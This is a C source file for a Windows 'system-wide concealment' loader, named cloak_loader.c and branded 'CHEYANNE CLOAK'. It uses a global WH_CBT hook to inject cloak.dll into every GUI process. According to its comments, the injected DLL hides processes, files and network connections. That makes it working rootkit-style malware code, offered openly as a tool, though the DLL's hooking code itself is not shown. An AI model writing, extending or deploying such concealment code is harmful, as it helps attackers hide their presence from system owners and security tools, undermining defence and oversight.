/*
 * cloak_loader.c — System-Wide Concealment Installer
 * 22DIV / george wu
 *
 * Installs a global WH_CBT hook using cloak.dll. Windows automatically
 * loads cloak.dll into every GUI process. On DLL_PROCESS_ATTACH, the
 * DLL installs inline hooks that hide processes, files, and connections.
 *
 * The loader must remain running to keep the hook active.
 * Press ENTER or Ctrl+C to unhook and exit.
 *
 * Usage: cloak_loader.exe [path_to_cloak.dll]
 *        Default: looks for cloak.dll in same directory as loader.
 */

#include <windows.h>
#include <stdio.h>

typedef void (*pfnSetCBTHook)(HHOOK);

int main(int argc, char *argv[]) {
    char dllPath[MAX_PATH] = {0};

    if (argc > 1) {
        strncpy(dllPath, argv[1], MAX_PATH - 1);
    } else {
        GetModuleFileNameA(NULL, dllPath, MAX_PATH);
        char *slash = strrchr(dllPath, '\\');
        if (slash) *(slash + 1) = '\0';
        strcat(dllPath, "cloak.dll");
    }

    printf("\n  CHEYANNE CLOAK — System-Wide Concealment\n");
    printf("  22DIV / george wu\n");
    printf("  =====================================\n\n");

    HMODULE hDll = LoadLibraryA(dllPath);
    if (!hDll) {
        printf("  [!] Failed to load %s (error %lu)\n", dllPath, GetLastError());
        return 1;
    }
    printf("  [+] Loaded: %s\n", dllPath);

    HOOKPROC proc = (HOOKPROC)GetProcAddress(hDll, "CloakHookProc");
    if (!proc) {
        printf("  [!] CloakHookProc not found in DLL\n");
        FreeLibrary(hDll);
        return 1;
    }

    HHOOK hHook = SetWindowsHookExA(WH_CBT, proc, hDll, 0);
    if (!hHook) {
        printf("  [!] SetWindowsHookEx failed (error %lu)\n", GetLastError());
        FreeLibrary(hDll);
        return 1;
    }

    pfnSetCBTHook setCBT = (pfnSetCBTHook)GetProcAddress(hDll, "SetCBTHook");
    if (setCBT) setCBT(hHook);

    printf("  [+] Global CBT hook installed — system-wide concealment active\n");
    printf("  [+] Hooks: process hiding, file hiding, connection hiding\n");
    printf("  [*] All GUI processes will load cloak.dll on next window event\n\n");
    printf("  Press ENTER to unhook and exit...\n");

    getchar();

    UnhookWindowsHookEx(hHook);
    FreeLibrary(hDll);
    printf("\n  [*] Hook removed — concealment deactivated\n");
    printf("  [*] Existing process hooks persist until those processes exit\n");

    return 0;
}
